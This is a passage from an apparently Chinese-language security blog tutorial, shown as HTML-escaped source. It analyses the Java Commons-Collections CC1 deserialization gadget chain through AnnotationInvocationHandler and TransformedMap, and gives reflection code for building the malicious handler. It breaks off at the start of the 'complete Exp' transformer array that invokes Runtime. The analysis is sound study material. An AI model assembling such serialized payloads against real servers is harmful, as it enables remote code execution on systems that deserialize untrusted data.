class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(ObjectInputStream var1)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; IOException, ClassNotFoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  var1.defaultReadObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;AnnotationType&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var2&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var2 = AnnotationType.getInstance(&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.type);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (IllegalArgumentException var9) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 异常抛出，被我删了，简化阅读。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var3&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; var2.memberTypes();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;Iterator&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var4&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.memberValues.entrySet().iterator();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(var4.hasNext()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Map.&lt;span class=&#34;type&#34;&gt;Entry&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var5&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Map.Entry)var4.next();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var6&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (String)var5.getKey();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var7&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Class)var3.get(var6);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (var7 != &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var8&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; var5.getValue();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!var7.isInstance(var8) &amp;amp;&amp;amp; !(var8 &lt;span class=&#34;keyword&#34;&gt;instanceof&lt;/span&gt; ExceptionProxy)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 注意看这里，这里有一个setValue的动作，实际上我们回想前边TransformedMap的回调函数触发机制，是不是也说明过setValue能触发decorate()的第三个参数的回调函数。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        var5.setValue(...).setMember(...);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在代码中我们可以注意到有调用setValue，在最开始介绍TransformedMap时就说过，除了put函数外呢，通过迭代器后调用setValue动作也会触发transform()函数的执行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;var5.setValue(...).setMember(......);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那么我们只要能将这个var5设为我们自定义的那个TransformedMap对应的迭代器，就可以进行rce。&lt;/p&gt;
&lt;p&gt;那么我们先来分析一下var5是哪来的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112802836.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;var5来自var4的&lt;code&gt;next()&lt;/code&gt;函数，继续跟进看看var4，var4来自memberValues，并且这里是调用了&lt;code&gt;iterator()&lt;/code&gt;获取一个迭代器，所以memberValues肯定是一个集合。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112812567.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;memberValues是在AnnotationInvocationHandler的构造函数传进来的一个map集合。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112822961.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们只要构造一个AnnotationInvocationHandler，然后将带有rce调用链的TransformedMap传入AnnotationInvocationHandler的构造函数，这样就能将memberValues赋值为带有恶意攻击的TransformedMap。&lt;/p&gt;
&lt;p&gt;然后我们将AnnotationInvocationHandler进行序列化，发送到目标服务器，当目标服务器在反序列化调用readObjet时，就会调用AnnotationInvocationHandler里的readObject，而恰好这个readObject内又调用了memberValues迭代器的setValue函数，那么他就会触发transform函数进行利用链的指向。&lt;/p&gt;
&lt;p&gt;有了思路后，我们就来实例化AnnotationInvocationHandler这个类，但是这个类的构造函数是私有的，所以我们这里需要通过Java的反射才能获取到这个类的实例。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;clazz&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; Class.forName(&lt;span class=&#34;string&#34;&gt;&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Constructor&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;construct&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; clazz.getDeclaredConstructor(Class.class, Map.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 设置这一行才能访问私有的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;construct.setAccessible(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 这里的transformedMap就是我们最开始分析的那个&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;expObj&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; construct.newInstance(Retention.class, transformedMap);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里我们注意到构造函数上还传了一个&lt;code&gt;Retention.class&lt;/code&gt;的东西，我们回到AnnotationInvocationHandler的构造函数逻辑来看一下。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;AnnotationInvocationHandler(Class&amp;lt;? &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Annotation&lt;/span&gt;&amp;gt; var1, Map&amp;lt;String, Object&amp;gt; var2) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Class[] var3 = var1.getInterfaces();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// 这里要求var1必须是一个注解，同时接口长度只能为1，并且要求第一个接口为Annotation&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (var1.isAnnotation() &amp;amp;&amp;amp; var3.length == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; var3[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] == Annotation.class) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 满足条件后会存入this.type这个成员属性里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.type = var1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.memberValues = var2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;AnnotationFormatError&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Attempt to create proxy for a non-annotation type.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;其实那个if就是在校验var1是不是一个注解，当然这里的逻辑实际上随便传一个符合这个条件的注解就可以了。这样我们就能构造一个AnnotationInvocationHandler的实例了。&lt;/p&gt;
&lt;p&gt;但是别急，我们回到AnnotationInvocationHandler的readObject函数，来分析一下var7，这个前边没有讲到。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var1.defaultReadObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;AnnotationType&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var2&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  var2 = AnnotationType.getInstance(&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.type);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (IllegalArgumentException var9) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var3&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; var2.memberTypes();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Iterator&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var4&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.memberValues.entrySet().iterator();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(var4.hasNext()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Map.&lt;span class=&#34;type&#34;&gt;Entry&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var5&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Map.Entry)var4.next();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var6&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (String)var5.getKey();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var7&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Class)var3.get(var6);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// 注意看这里，这里还有一个判断，如果var7为null，那么我们就无法进入到setValue，也就无法触发transform()。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (var7 != &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var5.setValue(......);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;那么来分析一下这个var7是哪里来的&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;var7 是通过&lt;code&gt;var3.get(var6)&lt;/code&gt;获得&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;var3 为&lt;code&gt;var2.memberTypes();&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;var2 为&lt;code&gt;AnnotationType.getInstance(this.type); &lt;/code&gt;这里的this.type实际上就是前边构造函数赋值的那个&lt;code&gt;Retention.class&lt;/code&gt;。然后得到一个AnnotationType&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;往回推，看&lt;code&gt;var2.memberTypes();&lt;/code&gt;得到的结果是一个map并且赋值给了var3&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;来看一下var3这个map里存的是什么值，其实就是一个键值对&lt;code&gt;&amp;#123;value=class java.lang.annotation.RetentionPolicy&amp;#125;&lt;/code&gt;，键是&lt;code&gt;value&lt;/code&gt;，值是&lt;code&gt;class java.lang.annotation.RetentionPolicy&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;AnnotationType&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;instance&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; AnnotationType.getInstance(Retention.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;System.out.println(instance.memberTypes());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112922215.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;&lt;p&gt;再回来看var7，var7是从var3.get(var6)中获得到的，并且随后进行了&lt;code&gt;var7 != null&lt;/code&gt;的判断，那么这里var3我们已经知道他里边存储的键值对是&lt;code&gt;&amp;#123;value=class java.lang.annotation.RetentionPolicy&amp;#125;&lt;/code&gt;，所以这里只需要能让&lt;code&gt;var3.get(&amp;quot;value&amp;quot;)&lt;/code&gt;达到这样的效果，那么var7就不会为null。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;那么var3.get()又是根据var6来的，看下边分析。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 而var4这个迭代器其实就是this.memberValues，而this.memberValues其实就是TransformedMap。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Iterator&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var4&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.memberValues.entrySet().iterator();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(var4.hasNext()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// var5呢就是var4这个迭代器输出的一个键值对包装类Map.Entry&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Map.&lt;span class=&#34;type&#34;&gt;Entry&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var5&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Map.Entry)var4.next();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// var6实际上就是var5这个键值对里的键&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;var6&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (String)var5.getKey();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;所以我们只需要在TransformedMap里存一个键值对为&lt;code&gt;value=xxx&lt;/code&gt;的，就可以让&lt;code&gt;var7 != null&lt;/code&gt;成立。从而进入执行setValue的代码&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;完整的Exp&#34;&gt;&lt;a href=&#34;#完整的Exp&#34; class=&#34;headerlink&#34; title=&#34;完整的Exp&#34;&gt;&lt;/a&gt;完整的Exp&lt;/h1&gt;&lt;p&gt;通过上边的分析后，我们只需要将所有的利用给串起来，最后生成AnnotationInvocationHandler的序列化数据即可。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt;[]&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ConstantTransformer&lt;/span&gt;(Runtime.getRuntime()),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    